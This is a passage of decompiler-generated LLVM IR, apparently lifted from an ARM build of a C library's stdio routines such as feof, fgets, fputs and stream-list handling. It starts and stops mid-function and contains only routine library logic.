  %v3_10fd0 = load i32, i32* %v2_10fd0, align 4
  store i32 %v3_10fd0, i32* %r5.global-to-local, align 4
  %v1_10fd4 = add i32 %v0_10fd4, -1
  store i32 %v1_10fd4, i32* %sl.global-to-local, align 4
  %v0_10fd8 = load i32, i32* %r7.global-to-local, align 4
  %v4_10fd8 = mul i32 %v1_10fd4, 4
  %v5_10fd8 = add i32 %v0_10fd8, %v4_10fd8
  store i32 %v5_10fd8, i32* %r3.global-to-local, align 4
  %v7_10fdc = icmp eq i32 %v3_10fd0, 8
  %v1_10fe0 = add i32 %v5_10fd8, 40
  %v2_10fe0 = inttoptr i32 %v1_10fe0 to i32*
  %v3_10fe0 = load i32, i32* %v2_10fe0, align 4
  store i32 %v3_10fe0, i32* @r0, align 4
  br i1 %v7_10fdc, label %dec_label_pc_11020, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %dec_label_pc_10fc8
  %v9_10fe8 = icmp eq i32 %v3_10fe0, %v3_10fd0
  br i1 %v9_10fe8, label %dec_label_pc_1100c, label %bb145

bb145:                                            ; preds = %dec_label_pc_10fe8
  %v8_10fec = icmp eq i32 %v3_10fe0, 8
  br i1 %v8_10fec, label %dec_label_pc_1100c, label %dec_label_pc_10ff4

dec_label_pc_10ff4:                               ; preds = %bb145
  %v0_10ff4 = call i32 @_promoted_size()
  %v0_10ffc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10ffc, i32* @r0, align 4
  %v0_11000 = call i32 @_promoted_size()
  store i32 %v0_11000, i32* %r0.global-to-local, align 4
  %v8_11008 = icmp sgt i32 %v0_10ff4, %v0_11000
  br i1 %v8_11008, label %dec_label_pc_11020, label %dec_label_pc_10ff4.dec_label_pc_1100c_crit_edge

dec_label_pc_10ff4.dec_label_pc_1100c_crit_edge:  ; preds = %dec_label_pc_10ff4
  %v1_11010.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11018.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_11018.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1100c

dec_label_pc_1100c:                               ; preds = %dec_label_pc_10ff4.dec_label_pc_1100c_crit_edge, %dec_label_pc_10fe8, %bb145
  %v1_11018 = phi i32 [ %v1_11018.pre, %dec_label_pc_10ff4.dec_label_pc_1100c_crit_edge ], [ %v1_10fd4, %dec_label_pc_10fe8 ], [ %v1_10fd4, %bb145 ]
  %v0_11018 = phi i32 [ %v0_11018.pre, %dec_label_pc_10ff4.dec_label_pc_1100c_crit_edge ], [ %v0_10fd8, %dec_label_pc_10fe8 ], [ %v0_10fd8, %bb145 ]
  %v1_11010 = phi i32 [ %v1_11010.pre, %dec_label_pc_10ff4.dec_label_pc_1100c_crit_edge ], [ %v1_10fcc, %dec_label_pc_10fe8 ], [ %v1_10fcc, %bb145 ]
  store i32 %v25_10bf0, i32* %r1.global-to-local, align 4
  %v4_11010 = mul i32 %v1_11010, 4
  %v5_11010 = add i32 %v4_11010, %v25_10bf0
  store i32 %v5_11010, i32* %r3.global-to-local, align 4
  %v1_11014 = add i32 %v5_11010, -12
  %v2_11014 = inttoptr i32 %v1_11014 to i32*
  %v3_11014 = load i32, i32* %v2_11014, align 4
  store i32 %v3_11014, i32* @r2, align 4
  %v4_11018 = mul i32 %v1_11018, 4
  %v5_11018 = add i32 %v4_11018, %v0_11018
  store i32 %v5_11018, i32* %r3.global-to-local, align 4
  %v2_1101c = add i32 %v5_11018, 40
  %v3_1101c = inttoptr i32 %v2_1101c to i32*
  store i32 %v3_11014, i32* %v3_1101c, align 4
  br label %dec_label_pc_11020

dec_label_pc_11020:                               ; preds = %dec_label_pc_10ff4, %dec_label_pc_10fc8, %dec_label_pc_1100c
  %v0_11020 = load i32, i32* %r7.global-to-local, align 4
  %v1_11020 = add i32 %v0_11020, 28
  %v2_11020 = inttoptr i32 %v1_11020 to i32*
  %v3_11020 = load i32, i32* %v2_11020, align 4
  %v0_11024 = load i32, i32* %r8.global-to-local, align 4
  %v1_11024 = add i32 %v0_11024, 1
  store i32 %v1_11024, i32* %r8.global-to-local, align 4
  %v1_11028 = add i32 %v3_11020, 2
  store i32 %v1_11028, i32* %r3.global-to-local, align 4
  %v6_11030 = icmp slt i32 %v1_11024, %v1_11028
  br i1 %v6_11030, label %dec_label_pc_10f8c, label %dec_label_pc_11050

dec_label_pc_11038:                               ; preds = %dec_label_pc_10f80
  %v0_11038 = load i32, i32* %r7.global-to-local, align 4
  %v1_11038 = add i32 %v0_11038, 28
  %v2_11038 = inttoptr i32 %v1_11038 to i32*
  %v3_11038 = load i32, i32* %v2_11038, align 4
  store i32 %v3_11038, i32* %r2.global-to-local, align 4
  %v0_1103c = load i32, i32* %r0.global-to-local, align 4
  %v1_1103c = trunc i32 %v0_1103c to i8
  %v3_1103c = add i32 %v0_11038, 38
  %v4_1103c = inttoptr i32 %v3_1103c to i8*
  store i8 %v1_1103c, i8* %v4_1103c, align 1
  %v0_11040 = load i32, i32* %r2.global-to-local, align 4
  %v3_11040 = mul i32 %v0_11040, 4
  store i32 %v3_11040, i32* @r2, align 4
  %v0_11044 = load i32, i32* %r7.global-to-local, align 4
  %v1_11044 = add i32 %v0_11044, 40
  store i32 %v1_11044, i32* @r0, align 4
  %v2_11048 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11048, i32* @r1, align 4
  %v0_1104c = call i32 @memcpy()
  store i32 %v0_1104c, i32* %r0.global-to-local, align 4
  %v0_11050.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %dec_label_pc_11020, %dec_label_pc_11038
  %v2_1106c = phi i32 [ %v0_11050.pre, %dec_label_pc_11038 ], [ %v0_11020, %dec_label_pc_11020 ]
  %v1_11050 = add i32 %v2_1106c, 16
  %v2_11050 = inttoptr i32 %v1_11050 to i32*
  %v3_11050 = load i32, i32* %v2_11050, align 4
  store i32 %v3_11050, i32* %r3.global-to-local, align 4
  %v1_11054 = and i32 %v3_11050, 128
  %v2_11054 = icmp eq i32 %v1_11054, 0
  br i1 %v2_11054, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_11050
  store i32 %v2_10bf8, i32* %r3.global-to-local, align 4
  %v2_1105c = inttoptr i32 %v2_1106c to i32*
  %v3_1105c = load i32, i32* %v2_1105c, align 4
  %v2_11064.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_11064 = sub i32 %v2_11064.pre, %v2_10bf8
  store i32 %v3_11064, i32* %r3.global-to-local, align 4
  %v5_11068 = mul i32 %v3_11064, 4
  %v6_11068 = add i32 %v5_11068, %v3_1105c
  store i32 %v6_11068, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_11050
  %v1_1106041 = load i32, i32* %r6.global-to-local, align 4
  %v2_1106042 = add i32 %v1_1106041, 1
  store i32 %v2_1106042, i32* %r3.global-to-local, align 4
  %v3_1106c = inttoptr i32 %v2_1106c to i32*
  store i32 %v2_1106042, i32* %v3_1106c, align 4
  %v0_11070.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_11078 = phi i32 [ %v2_1106c, %.thread44 ], [ %v0_11070.pre, %.thread46 ]
  %v1_11070 = add i32 %v1_11078, 28
  %v2_11070 = inttoptr i32 %v1_11070 to i32*
  %v3_11070 = load i32, i32* %v2_11070, align 4
  store i32 %v3_11070, i32* %r3.global-to-local, align 4
  %v1_11074 = add i32 %v3_11070, 2
  store i32 %v1_11074, i32* %r0.global-to-local, align 4
  %v0_11078 = load i32, i32* %sb.global-to-local, align 4
  %v2_11078 = add i32 %v1_11078, 24
  %v3_11078 = inttoptr i32 %v2_11078 to i32*
  store i32 %v0_11078, i32* %v3_11078, align 4
  br i1 %v2_11054, label %dec_label_pc_11088, label %bb147

bb147:                                            ; preds = %bb146
  %v1_1107c = load i32, i32* @r2, align 4
  %v2_1107c = load i32, i32* %r7.global-to-local, align 4
  %v3_1107c = inttoptr i32 %v2_1107c to i32*
  store i32 %v1_1107c, i32* %v3_1107c, align 4
  br label %dec_label_pc_11088

dec_label_pc_11084:                               ; preds = %dec_label_pc_10c40, %dec_label_pc_10d4c, %dec_label_pc_10dfc, %dec_label_pc_10dd0, %dec_label_pc_10ddc, %dec_label_pc_10d1c, %dec_label_pc_10fbc, %dec_label_pc_10f68, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11088

dec_label_pc_11088:                               ; preds = %bb147, %bb146, %dec_label_pc_11084
  %v2_1108c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1108c, i32* @r4, align 4
  store i32 %v6_10bf0, i32* @r5, align 4
  %v26_1108c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_1108c

; uselistorder directives
  uselistorder i32 %v3_11064, { 1, 0 }
  uselistorder i32 %v1_11024, { 1, 2, 0 }
  uselistorder i32 %v0_10fd8, { 1, 2, 0 }
  uselistorder i32 %v2_10fb4, { 1, 0 }
  uselistorder i32 %v1_10fb4, { 1, 0, 2 }
  uselistorder i32 %v0_10fd4, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_10f18, { 1, 2, 0 }
  uselistorder i32 %v3_10f00, { 1, 0 }
  uselistorder i32 %v3_10ef8, { 1, 0 }
  uselistorder i32 %v2_10ed8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10ec0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10ea4, { 1, 0, 2 }
  uselistorder i32 %v3_10e84, { 2, 1, 0 }
  uselistorder i32 %v1_10e48, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10e1c, { 1, 0 }
  uselistorder i32 %v5_10d7c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10d7c, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_10d28, { 1, 0 }
  uselistorder i32 %v0_10d44, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10d0c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10cf4, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_10ce0, { 1, 2, 0 }
  uselistorder i32 %v0_10d58, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10c94, { 1, 0 }
  uselistorder i32 %v1_10c64, { 0, 2, 1 }
  uselistorder i32 %v25_10bf0, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 17, 3, 7, 4, 1, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 10, 12, 11, 0, 2, 13, 3, 4, 5, 7, 9, 15, 6, 1, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 5, 26, 27, 28, 21, 0 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a07c.660 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a08c.658 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1a0a8.652 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1a068.650 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_11088, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11084, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_11050, { 1, 0 }
  uselistorder label %dec_label_pc_11020, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1100c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10fc8, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_10f80, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e34, { 1, 0 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10dbc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10d3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d38, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10c98, { 1, 0 }
  uselistorder label %dec_label_pc_10c88, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_110b4 = load i32, i32* @r4, align 4
  store i32 %v3_110b4, i32* %stack_var_-16, align 4
  %v2_110b8 = add i32 %tmp, 52
  %v3_110b8 = inttoptr i32 %v2_110b8 to i32*
  %v4_110b8 = load i32, i32* %v3_110b8, align 4
  store i32 %v4_110b8, i32* %r6.global-to-local, align 4
  %v2_110c0 = ptrtoint i32* %stack_var_-32 to i32
  %v2_110c4 = icmp eq i32 %v4_110b8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_110c0, i32* @r0, align 4
  br i1 %v2_110c4, label %dec_label_pc_110dc, label %dec_label_pc_110f8

dec_label_pc_110dc:                               ; preds = %entry
  %v1_110e4 = call i32 @__pthread_return_void()
  %v1_110f4 = call i32 @__pthread_return_0()
  %v0_110f8.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_11100.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_110f8

dec_label_pc_110f8:                               ; preds = %entry, %dec_label_pc_110dc
  %v0_11100 = phi i32 [ %v4_110b8, %entry ], [ %v0_11100.pre, %dec_label_pc_110dc ]
  %v0_110f8 = phi i32 [ %tmp, %entry ], [ %v0_110f8.pre, %dec_label_pc_110dc ]
  %v1_110f8 = add i32 %v0_110f8, 1
  %v2_110f8 = inttoptr i32 %v1_110f8 to i8*
  %v3_110f8 = load i8, i8* %v2_110f8, align 1
  %v4_110f8 = zext i8 %v3_110f8 to i32
  %v1_110fc = inttoptr i32 %v0_110f8 to i8*
  %v2_110fc = load i8, i8* %v1_110fc, align 1
  %v3_110fc = zext i8 %v2_110fc to i32
  %v2_11100 = icmp eq i32 %v0_11100, 0
  %v4_1110c = mul nuw nsw i32 %v4_110f8, 256
  %v5_1110c = or i32 %v3_110fc, %v4_1110c
  store i32 %v5_1110c, i32* %r4.global-to-local, align 4
  br i1 %v2_11100, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_110f8
  call void @__pseudo_branch(i32 79740)
  %v0_1111c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_110f8, %bb
  %v0_1111c = phi i32 [ %v5_1110c, %dec_label_pc_110f8 ], [ %v0_1111c.pre, %bb ]
  %v1_1111c = and i32 %v0_1111c, 4
  %v2_11124 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11124, i32* @r4, align 4
  ret i32 %v1_1111c

; uselistorder directives
  uselistorder i32 %v0_110f8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_110f8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11138 = load i32, i32* @r4, align 4
  store i32 %v3_11138, i32* %stack_var_-24, align 4
  %v6_11138 = load i32, i32* @r5, align 4
  %v9_11138 = load i32, i32* @r6, align 4
  %v12_11138 = load i32, i32* @r7, align 4
  %v1_1113c = add i32 %arg3, 52
  %v2_1113c = inttoptr i32 %v1_1113c to i32*
  %v3_1113c = load i32, i32* %v2_1113c, align 4
  store i32 %v3_1113c, i32* %r8.global-to-local, align 4
  %v2_11140 = ptrtoint i32* %stack_var_-40 to i32
  %v1_11144 = add i32 %arg3, 56
  store i32 %v1_11144, i32* @r5, align 4
  %v2_11148 = icmp eq i32 %v3_1113c, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_11140, i32* @r0, align 4
  br i1 %v2_11148, label %dec_label_pc_11168, label %dec_label_pc_11184

dec_label_pc_11168:                               ; preds = %entry
  %v1_11170 = call i32 @__pthread_return_void()
  store i32 70020, i32* @lr, align 4
  %v1_11180 = call i32 @__pthread_return_0()
  %v0_11184.pre = load i32, i32* @r6, align 4
  %v0_11188.pre = load i32, i32* @r4, align 4
  %v0_1118c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11184

dec_label_pc_11184:                               ; preds = %entry, %dec_label_pc_11168
  %v0_1118c = phi i32 [ %arg1, %entry ], [ %v0_1118c.pre, %dec_label_pc_11168 ]
  %v0_11188 = phi i32 [ %arg3, %entry ], [ %v0_11188.pre, %dec_label_pc_11168 ]
  %v0_11184 = phi i32 [ %arg2, %entry ], [ %v0_11184.pre, %dec_label_pc_11168 ]
  %v3_11190 = inttoptr i32 %v0_1118c to i8*
  %v4_11190 = call i32 @__GI_fgets_unlocked(i8* %v3_11190, i32 %v0_11184, i32 %v0_11188)
  %v0_11194 = load i32, i32* %r8.global-to-local, align 4
  %v2_11194 = icmp eq i32 %v0_11194, 0
  store i32 %v4_11190, i32* %r4.global-to-local, align 4
  br i1 %v2_11194, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11184
  store i32 70064, i32* @lr, align 4
  call void @__pseudo_branch(i32 79740)
  %v0_111b0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11184, %bb
  %v0_111b0 = phi i32 [ %v4_11190, %dec_label_pc_11184 ], [ %v0_111b0.pre, %bb ]
  %v2_111b8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_111b8, i32* @r4, align 4
  store i32 %v6_11138, i32* @r5, align 4
  store i32 %v9_11138, i32* @r6, align 4
  store i32 %v12_11138, i32* @r7, align 4
  ret i32 %v0_111b0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11184, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_111cc = load i32, i32* @r4, align 4
  store i32 %v3_111cc, i32* %stack_var_-20, align 4
  %v6_111cc = load i32, i32* @r5, align 4
  %v9_111cc = load i32, i32* @r6, align 4
  %v12_111cc = load i32, i32* @r7, align 4
  %v1_111d0 = add i32 %arg2, 52
  %v2_111d0 = inttoptr i32 %v1_111d0 to i32*
  %v3_111d0 = load i32, i32* %v2_111d0, align 4
  store i32 %v3_111d0, i32* @r7, align 4
  %v1_111d4 = add i32 %arg2, 56
  store i32 %v1_111d4, i32* @r5, align 4
  %v2_111d8 = ptrtoint i32* %stack_var_-36 to i32
  %v2_111dc = icmp eq i32 %v3_111d0, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_111d8, i32* @r0, align 4
  br i1 %v2_111dc, label %dec_label_pc_111f8, label %dec_label_pc_11214

dec_label_pc_111f8:                               ; preds = %entry
  %v1_11200 = call i32 @__pthread_return_void()
  store i32 70164, i32* @lr, align 4
  %v1_11210 = call i32 @__pthread_return_0()
  %v0_11214.pre = load i32, i32* @r4, align 4
  %v0_11218.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %entry, %dec_label_pc_111f8
  %v0_11218 = phi i32 [ %arg1, %entry ], [ %v0_11218.pre, %dec_label_pc_111f8 ]
  %v0_11214 = phi i32 [ %arg2, %entry ], [ %v0_11214.pre, %dec_label_pc_111f8 ]
  %v2_1121c = inttoptr i32 %v0_11218 to i8*
  %v3_1121c = call i32 @__GI_fputs_unlocked(i8* %v2_1121c, i32 %v0_11214)
  %v0_11220 = load i32, i32* @r7, align 4
  %v2_11220 = icmp eq i32 %v0_11220, 0
  store i32 %v3_1121c, i32* %r4.global-to-local, align 4
  br i1 %v2_11220, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11214
  call void @__pseudo_branch(i32 79740)
  %v0_1123c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11214, %bb
  %v0_1123c = phi i32 [ %v3_1121c, %dec_label_pc_11214 ], [ %v0_1123c.pre, %bb ]
  %v2_11244 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11244, i32* @r4, align 4
  store i32 %v6_111cc, i32* @r5, align 4
  store i32 %v9_111cc, i32* @r6, align 4
  store i32 %v12_111cc, i32* @r7, align 4
  ret i32 %v0_1123c

; uselistorder directives
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11214, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_1125c = ptrtoint i32* %stack_var_-48 to i32
  %v2_11260 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_11260, i32* @r0, align 4
  store i32 79740, i32* %r4.global-to-local, align 4
  %v1_11274 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r5.global-to-local, align 4
  %v1_11284 = call i32 @__pthread_return_0()
  %v2_1128c = load i32, i32* @global_var_28194.596, align 4
  %v7_11290 = icmp eq i32 %v2_1128c, 1
  br i1 %v7_11290, label %dec_label_pc_11298, label %dec_label_pc_11344

dec_label_pc_11298:                               ; preds = %entry
  %v2_1129c = load i32, i32* @global_var_28198.601, align 4
  %tmp19 = icmp slt i32 %v2_1129c, 1
  br i1 %tmp19, label %dec_label_pc_11344, label %dec_label_pc_112a8

dec_label_pc_112a8:                               ; preds = %dec_label_pc_11298
  store i32 %v2_1125c, i32* @r0, align 4
  %v1_112b8 = call i32 @__pthread_return_void()
  %v1_112c4 = call i32 @__pthread_return_0()
  %v2_112cc = load i32, i32* bitcast (i32** @global_var_23e14.616 to i32*), align 4
  store i32 %v2_112cc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1131c3 = icmp eq i32 %v2_112cc, 0
  br i1 %v2_1131c3, label %dec_label_pc_11328, label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_112a8, %dec_label_pc_11318
  %v1_112f0 = phi i32 [ %v0_11318, %dec_label_pc_11318 ], [ %v2_112cc, %dec_label_pc_112a8 ]
  %v1_112d8 = inttoptr i32 %v1_112f0 to i8*
  %v2_112d8 = load i8, i8* %v1_112d8, align 1
  %v3_112d8 = zext i8 %v2_112d8 to i32
  %v1_112dc = add i32 %v1_112f0, 1
  %v2_112dc = inttoptr i32 %v1_112dc to i8*
  %v3_112dc = load i8, i8* %v2_112dc, align 1
  %v4_112dc = zext i8 %v3_112dc to i32
  %v4_112e0 = mul nuw nsw i32 %v4_112dc, 256
  %v5_112e0 = or i32 %v4_112e0, %v3_112d8
  %v2_112e4 = and i32 %v5_112e0, 32816
  %v7_112e8 = icmp eq i32 %v2_112e4, 48
  %v1_112ec = add i32 %v1_112f0, 32
  %v2_112ec = inttoptr i32 %v1_112ec to i32*
  %v3_112ec = load i32, i32* %v2_112ec, align 4
  store i32 %v3_112ec, i32* %r5.global-to-local, align 4
  br i1 %v7_112e8, label %dec_label_pc_112f8, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_112d8
  store i32 %v1_112f0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11318

dec_label_pc_112f8:                               ; preds = %dec_label_pc_112d8
  %v0_112f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_112f8 = icmp eq i32 %v0_112f8, 0
  br i1 %v2_112f8, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_112f8
  %v3_11300 = add i32 %v0_112f8, 32
  %v4_11300 = inttoptr i32 %v3_11300 to i32*
  store i32 %v3_112ec, i32* %v4_11300, align 4
  %v0_11308.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_112f8
  store i32 %v3_112ec, i32* bitcast (i32** @global_var_23e14.616 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_11308 = phi i32 [ %v0_11308.pre, %.thread ], [ %v1_112f0, %.thread1 ]
  %v1_11308 = add i32 %v0_11308, 1
  %v2_11308 = inttoptr i32 %v1_11308 to i8*
  %v3_11308 = load i8, i8* %v2_11308, align 1
  %v1_1130c = and i8 %v3_11308, 32
  %v1_11314 = icmp ne i8 %v1_1130c, 0
  call void @__pseudo_cond_branch(i1 %v1_11314, i32 ptrtoint (i32* @global_var_127a8.598 to i32))
  %v0_11318.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %.thread12, %bb
  %v0_11318 = phi i32 [ %v0_11318.pre, %bb ], [ %v3_112ec, %.thread12 ]
  store i32 %v0_11318, i32* %r4.global-to-local, align 4
  %v2_1131c = icmp eq i32 %v0_11318, 0
  br i1 %v2_1131c, label %dec_label_pc_11328, label %dec_label_pc_112d8

dec_label_pc_11328:                               ; preds = %dec_label_pc_11318, %dec_label_pc_112a8
  store i32 %v2_1125c, i32* @r0, align 4
  %v1_11338 = call i32 @__pthread_return_void()
  %v0_11340 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11340, i32* @global_var_28198.601, align 4
  %v2_11348.pre = load i32, i32* @global_var_28194.596, align 4
  br label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %entry, %dec_label_pc_11298, %dec_label_pc_11328
  %v2_11348 = phi i32 [ %v2_1128c, %entry ], [ 1, %dec_label_pc_11298 ], [ %v2_11348.pre, %dec_label_pc_11328 ]
  %v1_1134c = add i32 %v2_11348, -1
  store i32 %v1_1134c, i32* @global_var_28194.596, align 4
  store i32 %v2_11260, i32* @r0, align 4
  store i32 70504, i32* @lr, align 4
  %v1_11364 = call i32 @__pthread_return_void()
  ret i32 %v1_11364

; uselistorder directives
  uselistorder i32 %v0_11318, { 2, 1, 0 }
  uselistorder i32 %v3_112ec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_112f0, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* @global_var_28198.601, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11344, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11318, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_112d8, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_11398 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_23e14.616 to i32), i32* %r3.global-to-local, align 4
